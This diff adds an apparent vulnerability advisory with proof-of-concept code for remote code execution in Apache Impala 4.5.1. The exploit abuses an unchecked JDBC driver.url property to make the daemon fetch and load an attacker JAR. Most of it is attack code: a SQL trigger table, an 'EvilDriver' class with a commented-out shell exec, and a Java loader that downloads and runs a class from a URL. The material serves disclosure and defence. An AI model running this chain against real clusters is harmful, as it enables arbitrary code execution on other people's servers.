@@ -1,0 +1,109 @@
+/*
+
+Apache Impala 4.5.1 Insufficient Authorization Remote Code Execution
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://impala.apache.org
+Affected version: <=4.5.1
+
+Summary: Apache Impala is a modern, open source, distributed SQL query
+engine for open data and table formats.
+
+Desc: Apache Impala versions 2.7.0 through 4.5.1 suffer from an insufficient
+authorization vulnerability that leads to remote code execution. A table
+created with STORED BY JDBC takes a driver.url property that Impala uses
+to fetch a remote JAR and load the named driver class on first query, and
+the driver.url and driver.class properties are not authorization-checked.
+An authenticated user who can create such a table can therefore point it
+at an attacker-controlled location and have code loaded and run on the Impala
+daemon hosts. The related CREATE DATA SOURCE path in CreateDataSrcStmt.java
+also carries a literal "// TODO: authorization check" where the privilege
+check belongs.
+
+------------------------------------------------------------------------
+ String driverLocalPath = FileSystemUtil.copyFileFromUriToLocal(driverUrl);
+ URL driverJarUrl = new File(driverLocalPath).toURI().toURL();
+ URLClassLoader driverLoader = URLClassLoader.newInstance(new URL[]{driverJarUrl}, ...);
+ dbcpDs.setDriverClassLoader(driverLoader);
+------------------------------------------------------------------------
+
+Tested on: Windows 10, OpenJDK/21.0.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6003
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6003
+
+
+13.08.2026
+
+--
+
+
+Cluster trigger:
+----------------
+CREATE EXTERNAL TABLE zsl (id INT)
+STORED BY JDBC
+TBLPROPERTIES (
+  "database.type" = "MYSQL",
+  "jdbc.url"      = "jdbc:mysql://jdbc.zeroscience.mk:3306/x",
+  "driver.url"    = "hdfs:///tmp/evil-driver.jar",
+  "jdbc.driver"   = "EvilDriver",
+  "table" = "x", "column.mapping" = "id"
+);
+SELECT * FROM zsl;
+
+
+
+EvilDriver.java:
+----------------
+public class EvilDriver {
+    static {
+        run("static-initializer");
+    }
+    public EvilDriver() {
+        run("constructor");
+    }
+    private static void run(String where) {
+        System.out.println(">>> EvilDriver " + where + " EXECUTING on the Impala JVM");
+        try {
+            new java.io.File("IMPALA_PWNED_" + where + ".txt").createNewFile();
+            //Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"});
+            System.out.println("> [poc pay load writt en]");
+        } catch (Exception e) {}
+    }
+}
+
+
+*/
+
+import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+
+public class Poc {
+    static String copyFileFromUriToLocal(String driverUrl) throws Exception {
+        String local = System.getProperty("java.io.tmpdir") + "/" + java.util.UUID.randomUUID() + ".jar";
+        try (InputStream in = new URL(driverUrl).openStream()) {
+            Files.copy(in, Paths.get(local), StandardCopyOption.REPLACE_EXISTING);
+        }
+        return local;
+    }
+    public static void main(String[] a) throws Exception {
+        String driverUrl   = a.length>0 ? a[0] : new File("evil-driver.jar").toURI().toString();
+        String driverClass = "EvilDriver";
+        System.out.println("driver.url   = " + driverUrl);
+        System.out.println("jdbc.driver  = " + driverClass);
+        String driverLocalPath = copyFileFromUriToLocal(driverUrl);
+        URL driverJarUrl = new File(driverLocalPath).toURI().toURL();
+        URLClassLoader driverLoader = URLClassLoader.newInstance(new URL[]{ driverJarUrl }, Poc.class.getClassLoader());
+        System.out.println("Loading and initializing attacker class.");
+        Class<?> c = Class.forName(driverClass, true, driverLoader);
+        c.getDeclaredConstructor().newInstance();
+        System.out.println("Done.");
+    }
+}
